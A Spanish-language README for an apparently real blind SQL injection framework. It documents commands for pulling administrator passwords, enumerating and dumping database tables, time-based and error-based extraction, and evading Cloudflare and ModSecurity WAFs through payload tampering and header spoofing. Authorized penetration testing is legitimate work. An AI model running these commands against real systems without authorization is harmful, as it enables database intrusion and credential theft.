# Blind-Finder v3.0

Framework de inyeccion SQL ciega para pruebas de seguridad autorizadas. Extrae datos de bases de datos a traves de canales booleanos, temporales, de error condicional y de error visible, sin requerir respuesta directa del servidor.

Soporta Oracle, MySQL y PostgreSQL. Incluye auto-deteccion de tecnica y dialecto, enumeracion sqlmap-style (`--dbs`, `--tables`, `--dump`), evasion de WAF, extraccion paralela, checkpoint/resume y reportes exportables.

> Este proyecto solo debe utilizarse contra sistemas para los que tengas autorizacion explicita.

---

## Indice

- [Instalacion](#instalacion)
- [Uso rapido](#uso-rapido)
- [Enumeracion y dump](#enumeracion-y-dump)
- [Auto-deteccion](#auto-deteccion)
- [Tecnicas de ataque](#tecnicas-de-ataque)
- [Evasion de WAF](#evasion-de-waf)
- [Checkpoint y resume](#checkpoint-y-resume)
- [Reportes](#reportes)
- [Referencia de flags](#referencia-de-flags)
- [Arquitectura](#arquitectura)
- [Tests](#tests)
- [Limitaciones conocidas](#limitaciones-conocidas)
- [Changelog](#changelog)
- [Licencia](#licencia)

---

## Instalacion

Requiere Python 3.11 o superior.

```bash
git clone https://github.com/Joapath/Blind-Injector.git
cd Blind-Injector
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Ejecucion directa sin instalar:

```bash
python3 -m cli --help
```

---

## Uso rapido

### Extraer un valor con deteccion automatica

```bash
python3 -m cli \
  --url "http://target.com/search" \
  --query "q=test" --parameter q --location query \
  --technique auto \
  --expression "(SELECT version())" \
  --max-length 50
```

La herramienta detecta la tecnica (boolean/time), el detector (length/text/status/timing) y el dialecto (mysql/postgres/oracle) automaticamente. Imprime lo que detecto antes de extraer:

```
[fingerprint] parameter=q location=query technique=boolean detector=length
dialect=mysql confidence=confirmed
```

### Extraer con tecnica manual (boolean + detector de texto)

```bash
python3 -m cli \
  --url "http://target.com/filter" \
  --parameter TrackingId --location cookie \
  --cookie "TrackingId=BASE" --cookie "session=TOKEN" \
  --detector text --true-text "Welcome back" \
  --expression "(SELECT password FROM users WHERE username='administrator')" \
  --max-length 30
```

### Importar request de Burp (`-r`)

Guardar la request cruda y marcar el punto de inyeccion con `*`:

```
GET /filter?category=Gifts HTTP/2
Host: target.com
Cookie: TrackingId=abc123*; session=xyz
```

```bash
python3 -m cli -r request.txt --technique auto \
  --expression "(SELECT password FROM users WHERE username='administrator')" \
  --max-length 30
```

---

## Enumeracion y dump

Operaciones de reconocimiento estilo sqlmap, sin escribir SQL a mano.

### Bases de datos

```bash
python3 -m cli --url "http://target.com/search" \
  --query "q=test" --parameter q --location query \
  --technique auto --dbs --max-length 120
```

### Tablas

```bash
python3 -m cli --url "http://target.com/search" \
  --query "q=test" --parameter q --location query \
  --technique auto --tables --max-length 120
```

### Columnas de una tabla

```bash
python3 -m cli --url "http://target.com/search" \
  --query "q=test" --parameter q --location query \
  --technique auto --list-columns -T users --max-length 120
```

### Dump completo de una tabla

```bash
python3 -m cli --url "http://target.com/search" \
  --query "q=test" --parameter q --location query \
  --technique auto --dump -T users --dump-limit 10 --max-length 80
```

El dump opera en 3 pasos automaticos:
1. Descubre las columnas de la tabla
2. Cuenta las filas
3. Extrae cada fila como string concatenado y lo parsea en columnas

Se puede especificar columnas manualmente con `-C user,pass,email` y limitar filas con `--dump-limit`.

### Otros atajos

| Flag | Extrae |
|---|---|
| `--dbs` | Bases de datos / schemas |
| `--tables` | Tablas del schema actual |
| `--list-columns` | Columnas de la tabla (`-T`) |
| `--dump` | Filas completas de la tabla (`-T`) |
| `--count` | Cantidad de filas de la tabla (`-T`) |
| `--current-db` | Base de datos actual |
| `--current-user` | Usuario de base de datos actual |

Todos requieren que el dialecto sea conocido (por auto-deteccion o `--dialect`).

---

## Auto-deteccion

`--technique auto` sondea el punto de inyeccion antes de extraer, probando en orden:

1. **Boolean**: compara `1=1` vs `1=2`. Si difieren en longitud, texto o status, usa ese detector.
2. **Time**: prueba sleep en MySQL y PostgreSQL, midiendo latencia.
3. **Error**: provoca errores de sintaxis y los compara contra firmas conocidas de cada motor.

Tambien detecta el dialecto SQL automaticamente cuando es posible. Cada deteccion se confirma dos veces antes de aceptarla.

Si no puede determinar la tecnica con confianza, falla con mensaje explicito en vez de adivinar.

### Probar todos los parametros

Sin `--parameter`, prueba cada parametro de query, cookie y body hasta encontrar uno inyectable:

```bash
python3 -m cli -r request.txt --technique auto --dump -T users
```

```
[probe] parameter=category location=query -> no oracle
[probe] parameter=TrackingId location=cookie -> boolean/text (confidence=confirmed)
```

---

## Tecnicas de ataque

### Boolean (default)

Infiere datos por diferencias observables en la respuesta (texto, longitud, status code).

```bash
python3 -m cli --technique boolean --detector text --true-text "Welcome back" ...
```

### Time-based

Infiere datos por latencia controlada con `SLEEP()` / `pg_sleep()`.

```bash
python3 -m cli --technique time --dialect mysql \
  --sleep-seconds 3 --auto-calibrate \
  --expression "(SELECT password FROM users LIMIT 1)" --max-length 30
```

`--auto-calibrate` mide la latencia real del endpoint y calcula automaticamente el `timing_threshold`, `timing_baseline` y `timing_tolerance`.

### Conditional-error (Oracle)

Usa errores de base de datos como senal booleana.

```bash
python3 -m cli --attack-mode conditional-error \
  --error-regex "ORA-[0-9]+" --dialect oracle ...
```

### Visible-error (PostgreSQL)

Lee el valor completo directamente del cuerpo del error en un solo request.

```bash
python3 -m cli --technique visible-error --attack-mode visible-error \
  --dialect postgres --detector error \
  --injection-mode replace ...
```

---

## Evasion de WAF

### Tampers de payload

Transformaciones sobre el payload inyectado, aplicables individualmente o como perfil:

```bash
# Tampers individuales
python3 -m cli --tamper space2comment,randomcase ...

# Perfil predefinido
python3 -m cli --tamper-profile cloudflare ...
```

Tampers disponibles: `space2comment`, `space2plus`, `randomcase`, `charencode`, `doubleencode`, `versionedcomment`, `equaltolike`.

Perfiles: `generic-waf`, `cloudflare`, `modsecurity`.

### Mutacion de headers

```bash
python3 -m cli --random-agent --random-xff ...
```

- `--random-agent`: rota el User-Agent en cada request
- `--random-xff`: randomiza X-Forwarded-For, X-Originating-IP, X-Real-IP, X-Client-IP

---

## Checkpoint y resume

Cada ejecucion guarda progreso incremental bajo `~/.blind-finder/checkpoints`. Si se interrumpe, repetir el mismo comando con `--resume` continua desde la ultima posicion confirmada:

```bash
# Se interrumpe
python3 -m cli --url "..." --expression "..." --max-length 50
# Ctrl+C

# Continua donde quedo
python3 -m cli --url "..." --expression "..." --max-length 50 --resume
```

El checkpoint se identifica por hash de la configuracion completa. Al completar la extraccion, se borra automaticamente.

---

## Reportes

```bash
python3 -m cli ... --report-file report.json --report-format json
```

Genera un resumen con target, tecnica, dialecto, duracion y por cada expresion: valor extraido, estado (completa/incompleta), longitud y requests consumidos. Formatos: `json` o `csv`.

---

## Referencia de flags

### General

| Flag | Descripcion |
|---|---|
| `--verbose` | Salida detallada |
| `--log-file PATH` | Log a archivo |
| `--resume` | Reanuda desde checkpoint |
| `--checkpoint-dir PATH` | Directorio de checkpoints |
| `--report-file PATH` | Escribe reporte al terminar |
| `--report-format` | `json` (default) o `csv` |

### Target e inyeccion

| Flag | Descripcion |
|---|---|
| `--url URL` | URL del objetivo |
| `-r PATH` | Request HTTP cruda (Burp) |
| `--force-ssl` | HTTPS con `-r` |
| `--method` | `GET` o `POST` |
| `--parameter NAME` | Parametro a inyectar |
| `--location` | `query`, `body` o `cookie` |
| `--injection-mode` | `append` o `replace` |

### Transporte

| Flag | Descripcion |
|---|---|
| `--query`, `--body`, `--cookie`, `--header` | `KEY=VALUE`, repetibles |
| `--proxy URL` | Proxy HTTP/SOCKS |
| `--timeout SECONDS` | Timeout HTTP (default 10) |
| `--allow-redirects` | Seguir redirecciones |
| `--max-retries COUNT` | Reintentos HTTP |
| `--retry-backoff SECONDS` | Backoff entre reintentos |
| `--insecure` | Deshabilitar verificacion TLS |
| `--rate-limit N` | Requests/segundo maximo |

### Enumeracion

| Flag | Descripcion |
|---|---|
| `--dbs` | Listar bases de datos |
| `--tables` | Listar tablas |
| `--list-columns` | Listar columnas de `-T` |
| `--dump` | Dump de filas de `-T` |
| `--count` | Contar filas de `-T` |
| `--current-db` | Base de datos actual |
| `--current-user` | Usuario actual |
| `-T NAME` | Tabla objetivo |
| `-D DB` | Base de datos objetivo |
| `-C COL,COL,...` | Columnas especificas para dump |
| `--dump-limit N` | Limite de filas a extraer |
| `--expression SQL` | Expresion SQL libre (repetible) |
| `--enum KIND` | Query enlatada (repetible) |

### Extraccion

| Flag | Descripcion |
|---|---|
| `--strategy` | `binary` o `brute` |
| `--charset CHARS` | Caracteres candidatos |
| `--max-length N` | Longitud maxima (default 100) |
| `--delay SECONDS` | Retardo entre requests |
| `--threads N` | Workers paralelos |

### Tecnica y deteccion

| Flag | Descripcion |
|---|---|
| `--technique` | `boolean`, `time`, `visible-error`, `auto` |
| `--attack-mode` | `conditional-response`, `conditional-error`, `visible-error` |
| `--dialect` | `oracle`, `mysql`, `postgres` |
| `--detector` | `text`, `length`, `status`, `error`, `timing` |
| `--true-text TEXT` | Texto que identifica respuesta positiva |
| `--expected-length N` | Longitud esperada en respuesta positiva |
| `--expected-status CODE` | Status code esperado en respuesta positiva |
| `--error-text TEXT` | Texto de error (conditional-error) |
| `--error-regex PATTERN` | Regex de error |
| `--error-value-regex PATTERN` | Regex con grupo `value` (visible-error) |
| `--error-status CODE` | Status code de error |
| `--sleep-seconds N` | Segundos de sleep (time-based) |
| `--timing-threshold N` | Umbral de timing |
| `--auto-calibrate` | Calibracion automatica de timing |

### Evasion

| Flag | Descripcion |
|---|---|
| `--tamper NAMES` | Tampers separados por coma |
| `--tamper-profile NAME` | Perfil predefinido |
| `--random-agent` | Rotar User-Agent |
| `--random-xff` | Randomizar headers XFF |

Referencia completa: `python3 -m cli --help`

---

## Arquitectura

```
Blind-Injector/
  cli/            Interfaz de linea de comandos, parsing, flujo dump/enum
  config/         Factory de engine, calibracion, fingerprint
  core/           Engine, extractor, busqueda binaria, tecnicas, checkpoint
  detection/      Detectores: text, length, status, error, timing
  payloads/       Builders de condicion, inyeccion, tamper
  transport/      Cliente HTTP, rate limiter, header mutating
  models/         Dataclasses inmutables: request, response, config
  ui/             Consola Rich, progress bars
  utils/          Logging
  tests/          364 unit tests (sin acceso a red)
```

Flujo de una extraccion:

```
CLI args -> AttackConfiguration -> Factory -> BlindAttackEngine
  -> Technique.validate/probe/confirm
  -> BlindExtractor.extract()
    -> binary search LENGTH() (con verificacion)
    -> por cada posicion: binary search ASCII(SUBSTRING())
    -> SearchStrategy.find() + confirmation query
  -> AttackResult
```

---

## Tests

```bash
python3 -m unittest discover -s tests -v
```

364 tests. Todos corren sin acceso a red (fakes/mocks). Cubren extractor, engine, payloads, deteccion, CLI, fingerprint, checkpoint, tampers, calibracion y busqueda.

---

## Limitaciones conocidas

- **Caracteres Unicode**: `ASCII(SUBSTRING(...))` en MySQL retorna el primer byte UTF-8 para caracteres multibyte. Valores con acentos (Garcia, etc.) se extraen truncados. Misma limitacion que sqlmap.
- **Inyeccion numerica**: Solo soporta contexto de inyeccion string. Endpoints con parametros numericos puros requieren soporte adicional.
- **Body format**: Solo `application/x-www-form-urlencoded`. JSON y multipart no estan soportados.
- **WAF evasion**: Manual. No hay deteccion automatica de bloqueo con retry.

---

## Changelog

Ver [CHANGELOG.md](CHANGELOG.md) para el historial completo de versiones.

---

## Licencia

Uso exclusivo para pruebas de seguridad autorizadas. Consultar el archivo de metadatos del repositorio para la licencia aplicable.

---

Desarrollado por [Joapath](https://github.com/Joapath)
